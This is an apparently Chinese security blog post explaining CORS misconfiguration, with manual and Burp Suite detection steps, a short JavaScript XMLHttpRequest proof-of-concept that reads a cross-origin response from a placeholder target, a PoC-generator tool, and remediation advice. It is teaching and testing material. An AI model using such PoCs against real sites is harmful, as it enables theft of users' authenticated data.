# 原创
：  漏洞分析 | CORS讲解与实战利用

# 漏洞分析 | CORS讲解与实战利用

#### 产生原因

同源策略：如果两个URL的协议、域名、端口号都相同，就称这两个URL同源。

同源策略（SOP）限制了应用程序之间的信息共享，并且仅允许在托管应用程序的域内共享。这有效防止了系统机密信息的泄露。但与此同时，也带来了另外的问题。随着Web应用程序和微服务使用的日益增长，出于实用目的往往需要将信息从一个子域传递到另一个子域，或者在不同域之间进行传递（例如将访问令牌和会话标识符，传递给另一个应用程序）。

为了允许跨域通信，开发人员必须使用不同的技术来绕过SOP并传递敏感信息，以至于现今也成为了一个棘手的安全问题。因此，为了在不影响应用程序安全状态的情况下实现信息共享，在HTML5中引入了跨源资源共享（CORS）。但问题也随之而来，许多人为了方便干脆直接使用默认的配置，或是由于缺乏对此的了解而导致了错误的配置。

#### CORS跨域资源共享

CORS，跨域资源共享（Cross-origin resource sharing），这种机制通过添加HTTP字段的方式规定服务器资源允许被哪些域访问（Access-Control-Allow-Origin）、请求中是否允许发送cookie（Access-Control-Allow-Credentials）、哪些请求类型是被允许的（Access-Control-Request-Method）等等。

#### 手工验证方式

在正常的api请求处,headers加入”origin”:”http://xx.xx.xx.xx“, 如果接口正常返回了数据且headers里包含：

```
access-control-allow-credentials : true</code><code>access-control-allow-origin : http://xx.xx.xx.xx
```

就说明这个接口确实存在CORS漏洞。

#### 实战技巧

使用 **burpsuite **选择 **Proxy** 模块中的 **Options 选项**，找到**Match and Replace**这一栏，勾选**Request header** 将空替换为**Origin:foo.example.org**的 **Enable**框。

<br/> HTTP history列表中出现符合条件的请求包，发送到Repeater中，点击GO，若存在如下图所示，即该处可能有CORS漏洞。

响应包组合应是这种(存在CORS)：
1.  `Access-Control-Allow-Origin: foo.example.org` 1.  `Access-Control-Allow-Credentials: true` 
注意！如下组合是没有漏洞的。因为浏览器已经会阻止如下配置。(不存在CORS)
1.  `Access-Control-Allow-Origin: *` 1.  `Access-Control-Allow-Credentials: true` 
利用效果：

#### 实战：

抓包发现请求头中存在Origin，将其修改为*

发现Access-Control-Allow-Origin:返回的*<br/>  

<br/> 该处的数据包，所有域可以访问本域的资源。说明该接口可能存在CORS漏洞。

以GET的形式POC
1.  `&lt;!DOCTYPE&gt;` 1.  `&lt;html&gt;` 1.  `&lt;script type="text/javascript"&gt;` 1.  `function loadXMLDoc()` 1.  `{` 1.  `var xhr = new XMLHttpRequest();` 1.   1.  `xhr.onreadystatechange=function()` 1.  `{` 1.  `if(xhr.readyState == 4 &amp;&amp; xhr.status == 200) //if receive xhr response` 1.  `{` 1.  `var datas=xhr.responseText;` 1.  `alert(datas);` 1.  `}` 1.  `}` 1.  `//request vuln page` 1.  `xhr.open("GET","http://www.target.com","true") //网页地址` 1.  `xhr.send();` 1.  `}` 1.  `loadXMLDoc();` 1.  `&lt;/script&gt;` 1.  `&lt;/html&gt;` 
##### 不存在CORS漏洞的情况下

当进行利用的时候，爆出底下红色部分时：

<br/> 则不存在CORS，不允许跨域。

#### 工具推荐

下载地址：https://github.com/0verSp4ce/PoCBox

##### docker安装：

拉取镜像：

```
docker pull registry.cn-hangzhou.aliyuncs.com/pocbox/pocbox:1.0
```

运行：

```
docker container run -d -p 76:80 registry.cn-hangzhou.aliyuncs.com/pocbox/pocbox:1.0
```

访问：

```
http://ip:76
```

本地搭建好后在图示处填入相关数据后即可生成poc code

利用过程：

效果图如下:

<br/> 其中CORS漏洞存在GET方式和POST方式，具体根据实战情况。

#### 修复建议

> 
1、关闭非正式开启的CORS<br/> 2、白名单限制：定义“源”的白名单，避免使用正则表达式，不要配置Access-Control-Allow-Origin为通配符*或null，严格效验来自请求数据包中Origin的值<br/> 3、仅允许使用安全协议，避免中间人攻击


  申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
